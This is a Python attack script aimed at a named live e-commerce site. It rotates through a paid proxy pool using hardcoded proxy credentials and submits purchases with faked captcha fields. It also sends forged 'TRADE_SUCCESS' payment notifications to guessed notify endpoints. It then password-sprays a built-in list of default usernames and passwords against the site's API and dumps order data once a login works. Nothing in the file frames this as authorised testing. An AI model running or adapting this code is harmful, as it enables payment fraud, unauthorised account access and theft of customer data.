#!/usr/bin/env python3
"""Follow alipay.php for epay params; spray fenzhan user/pass on act=change/orders."""
import json
import re
import subprocess
import time
import urllib.parse
from pathlib import Path

OUT = Path("/tmp/qq1_deep7")
OUT.mkdir(exist_ok=True)
QG, PW = "C413ED6D", "344F550A6F8B"
BASE = "https://qq1.lol"
JAR = str(OUT / "spray.jar")
LOG = OUT / "spray.log"
REPORT = OUT / "spray_report.json"
HIT = OUT / "FENZHAN_HIT.txt"
report = {"creds_tested": 0, "findings": [], "pay": {}}


def log(m):
    line = f"[{time.strftime('%H:%M:%S')}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def pool_servers():
    try:
        raw = subprocess.check_output(
            ["curl", "-s", f"https://share.proxy.qg.net/query?key={QG}"], text=True, timeout=12
        )
        d = json.loads(raw)
        return [x["server"] for x in (d.get("data") or [])]
    except Exception:
        return []


class PX:
    def __init__(self):
        self.servers = pool_servers()
        self.i = 0
        log(f"servers={len(self.servers)}")

    def get(self):
        if not self.servers:
            self.servers = pool_servers()
            self.i = 0
        if not self.servers:
            return None
        return f"http://{QG}:{PW}@{self.servers[self.i % len(self.servers)]}"

    def rot(self):
        self.i += 1
        if self.i >= max(len(self.servers), 1):
            self.servers = pool_servers()
            self.i = 0


pxp = PX()


def curl(url, post=None, mt=16, tries=5):
    last = ("", "000")
    for _ in range(tries):
        px = pxp.get()
        if not px:
            time.sleep(2)
            pxp.rot()
            continue
        cmd = [
            "curl", "-sk", "--max-time", str(mt), "-x", px, "-b", JAR, "-c", JAR,
            "-A", "Mozilla/5.0", "-L",  # follow redirects
            "-H", "Referer: https://qq1.lol/",
            "-H", "X-Requested-With: XMLHttpRequest",
            "-w", "\n__HTTP:%{http_code}",
        ]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else post
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 8).stdout or ""
        except Exception as e:
            out = str(e)
        if "__HTTP:" not in out:
            pxp.rot()
            continue
        b, code = out.rsplit("__HTTP:", 1)
        last = (b.strip(), code.strip())
        if code.strip() == "200" and b.strip():
            return last
        pxp.rot()
        time.sleep(0.3)
    return last


def pay_follow():
    log("=== PAY FOLLOW alipay.php ===")
    Path(JAR).unlink(missing_ok=True)
    curl(BASE + "/")
    buy, _ = curl(BASE + "/?mod=buy&cid=4&tid=102")
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy or "")
    hs_m = re.search(r"var hashsalt=(.+);", buy or "")
    if not csrf or not hs_m:
        log("no tokens")
        return
    try:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=5,
        ).stdout.strip()
    except Exception:
        hs = hs_m.group(1).strip().strip("'\"")
    pay, _ = curl(BASE + "/ajax.php?act=pay", {
        "tid": "102", "num": "1", "inputvalue": "spraypay",
        "csrf_token": csrf.group(1), "hashsalt": hs,
        "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
    })
    log(f"pay {(pay or '')[:200]}")
    tn_m = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    if not tn_m:
        return
    tn = tn_m.group(1)
    report["pay"]["trade_no"] = tn
    # follow chain
    for url in [
        f"{BASE}/other/submit.php?type=alipay&orderid={tn}",
        f"{BASE}/other/alipay.php?trade_no={tn}",
        f"{BASE}/alipay.php?trade_no={tn}",
        f"{BASE}/other/submit.php?type=alipay&trade_no={tn}",
    ]:
        body, code = curl(url)
        (OUT / ("follow_" + re.sub(r"\W+", "_", url[-40:]) + ".html")).write_text(body or "", errors="replace")
        urls = re.findall(r"https?://[a-zA-Z0-9._:/=?&%-]+", body or "")
        pids = re.findall(r'pid["\']?\s*[:=]\s*["\']?([0-9]+)', body or "", re.I)
        pids += re.findall(r'name=["\']pid["\'][^>]*value=["\']([^"\']+)', body or "", re.I)
        keys = re.findall(r'name=["\']key["\'][^>]*value=["\']([^"\']+)', body or "", re.I)
        signs = re.findall(r'name=["\']sign["\'][^>]*value=["\']([^"\']+)', body or "", re.I)
        money = re.findall(r'name=["\']money["\'][^>]*value=["\']([^"\']+)', body or "", re.I)
        loc = re.findall(r"location\.href\s*=\s*['\"]([^'\"]+)", body or "")
        info = {"url": url, "code": code, "len": len(body or ""), "urls": urls[:15],
                "pids": pids, "keys": keys, "signs": signs, "money": money, "loc": loc}
        report["pay"][url.split("/")[-1][:40]] = info
        log(f"FOLLOW {url.split('.lol')[1]}: {info}")
        # if JS redirect relative, follow
        for rel in loc:
            if rel.startswith("./") or rel.startswith("alipay") or "trade_no" in rel:
                full = urllib.parse.urljoin(url, rel)
                b2, c2 = curl(full)
                (OUT / "alipay_final.html").write_text(b2 or "", errors="replace")
                urls2 = re.findall(r"https?://[a-zA-Z0-9._:/=?&%-]+", b2 or "")
                pids2 = re.findall(r'pid["\']?\s*[:=]\s*["\']?([0-9]+)', b2 or "", re.I)
                pids2 += re.findall(r'name=["\']pid["\'][^>]*value=["\']([^"\']+)', b2 or "", re.I)
                log(f"  final {full}: len={len(b2 or '')} pids={pids2} urls={urls2[:8]}")
                report["pay"]["alipay_final"] = {
                    "len": len(b2 or ""), "pids": pids2, "urls": urls2[:20],
                    "snippet": (b2 or "")[:1500],
                }
                # try notify paths from epay domain patterns
                for npath in [
                    f"{BASE}/other/notify.php?type=alipay",
                    f"{BASE}/other/alipay_notify.php",
                    f"{BASE}/other/epay_notify.php",
                    f"{BASE}/other/notify/alipay.php",
                ]:
                    nb, _ = curl(npath, {
                        "out_trade_no": tn, "trade_no": "E" + tn,
                        "trade_status": "TRADE_SUCCESS",
                        "money": money[0] if money else "1",
                        "pid": (pids2 or pids or ["1"])[0],
                        "type": "alipay", "sign": "test", "name": "x",
                    })
                    log(f"  notify {npath.split('/')[-1]}: {(nb or '')[:120]}")
        time.sleep(0.4)


def cred_list():
    users = [
        "buyi", "buyiq", "qqkqq", "qq1", "admin", "test", "user", "demo",
        "faka", "ka1", "site", "zhan", "fenzhan", "agent", "daili", "vip",
        "qqkzc", "root", "administrator",
    ]
    pwds = [
        "123456", "admin123", "buyi123", "buyi888", "buyi666", "qq1123", "qq123456",
        "888888", "666666", "111111", "000000", "password", "admin", "admin888",
        "buyi2025", "buyi2026", "qqkqq123", "Aa123456", "abc123", "12345678",
        "faka123", "test123", "1qaz2wsx", "qwer1234",
    ]
    pairs = []
    for u in users:
        for p in pwds:
            pairs.append((u, p))
        pairs.append((u, u))
        pairs.append((u, u + "123"))
        pairs.append((u, u + "888"))
    # unique
    seen = set()
    out = []
    for pair in pairs:
        if pair not in seen:
            seen.add(pair)
            out.append(pair)
    return out


def spray():
    log("=== FENZHAN USER/PASS SPRAY on change ===")
    pairs = cred_list()
    log(f"pairs={len(pairs)}")
    for i, (user, pwd) in enumerate(pairs):
        body, code = curl(
            f"{BASE}/%61pi.php?act=change&id=25949&zt=1",
            {"user": user, "pass": pwd},
            tries=4,
        )
        report["creds_tested"] = i + 1
        if not body:
            continue
        if "用户名或密码不正确" in body or "已被封禁" in body:
            pass
        elif "请提供" in body:
            log(f"needauth? {user}/{pwd}: {body[:80]}")
        elif "密钥" in body:
            log(f"keymsg {user}/{pwd}: {body[:80]}")
        elif "成功" in body or '"code":1' in body or '"code":0' in body:
            hit = f"{user}:{pwd}\n{body}"
            HIT.write_text(hit)
            report["findings"].append({"user": user, "pass": pwd, "body": body[:1000]})
            log(f"*** CRED HIT {user}/{pwd}: {body[:200]}")
            # dump orders
            o, _ = curl(f"{BASE}/%61pi.php?act=orders", {"user": user, "pass": pwd, "limit": "20", "tid": "102"})
            (OUT / "orders_dump.json").write_text((o or "")[:200000])
            log(f"orders: {(o or '')[:200]}")
            break
        elif "不合法" in body or "不存在" in body:
            # authenticated but bad zt/id — still a hit!
            hit = f"{user}:{pwd}\n{body}"
            HIT.write_text(hit)
            report["findings"].append({"user": user, "pass": pwd, "body": body[:1000], "note": "auth_ok_bad_param"})
            log(f"*** AUTH OK {user}/{pwd}: {body[:200]}")
            break
        else:
            if "<!DOCTYPE" not in body[:30] and "危险" not in body:
                log(f"unusual {user}/{pwd}: {body[:120]}")
        if i and i % 40 == 0:
            log(f"spray progress {i}/{len(pairs)}")
            REPORT.write_text(json.dumps(report, ensure_ascii=False, indent=2))
            pxp.rot()
        time.sleep(0.18)


def main():
    open(LOG, "w").write("")
    log("=== SPRAY START ===")
    pay_follow()
    spray()
    REPORT.write_text(json.dumps(report, ensure_ascii=False, indent=2))
    log(f"=== DONE findings={len(report['findings'])} tested={report['creds_tested']} ===")


if __name__ == "__main__":
    main()
